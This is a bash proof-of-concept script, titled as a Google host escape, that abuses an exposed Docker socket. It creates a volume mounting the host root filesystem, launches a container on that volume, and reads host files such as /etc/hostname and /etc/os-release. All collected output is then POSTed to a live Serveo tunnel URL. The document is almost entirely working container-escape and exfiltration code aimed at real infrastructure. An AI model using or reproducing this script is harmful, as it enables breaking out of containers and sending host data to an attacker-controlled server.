#!/bin/bash
# TARGET: Update this with your live Serveo URL
URL="1cb5413e91fecf51-103-95-173-85.serveousercontent.com"

{
  echo "=== [!] GOOGLE HOST ESCAPE: FULL PoC ==="
  
  # 1. Create the Exploit Volume (Mounts Host Root)
  curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/volumes/create" \
    -H "Content-Type: application/json" \
    -d '{"Name": "host_root_exploit", "Driver": "local", "DriverOpts": {"type": "none", "device": "/", "o": "bind"}}' > /dev/null

  # 2. Dynamically find a local Docker Image
  IMG=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | grep -oE '"Id":"sha256:[a-f0-9]+"' | head -1 | cut -d'"' -f4)

  # 3. Create the Escape Container
  CID=$(curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d "{\"Image\": \"$IMG\", \"HostConfig\": {\"Binds\": [\"host_root_exploit:/host_data:ro\"]}}" | grep -oE '"Id":"[a-f0-9]+"' | cut -d'"' -f4)

  if [ -n "$CID" ]; then
    curl -s --unix-socket /var/run/docker.sock -X POST "http://localhost/containers/$CID/start"
    sleep 2
    
    echo "--- HOST IDENTITY ---"
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/archive?path=/host_data/etc/hostname" | tar -xO
    
    echo "--- HOST OS RELEASE ---"
    curl -s --unix-socket /var/run/docker.sock "http://localhost/containers/$CID/archive?path=/host_data/etc/os-release" | tar -xO

    # Cleanup
    curl -s --unix-socket /var/run/docker.sock -X DELETE "http://localhost/containers/$CID?force=true" > /dev/null
  fi
} | curl -s -X POST --data-binary @- "https://$URL"
